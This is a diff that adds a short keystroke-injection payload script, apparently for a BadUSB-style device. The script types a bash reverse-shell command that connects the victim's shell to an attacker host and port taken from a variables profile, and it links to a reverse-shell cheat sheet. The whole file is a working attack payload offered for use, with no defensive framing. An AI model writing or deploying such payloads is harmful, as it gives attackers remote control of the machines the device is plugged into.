@@ -1,0 +1,7 @@
+DEFAULTCHARDELAY 15
+
+REM DOC: Uses LHOST and LPORT from the SetVars profile
+
+REM DOC: More info: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
+
+STRING bash -c 'bash -i >&/dev/tcp/'$DP_LHOST'/'$DP_LPORT' 0>&1'
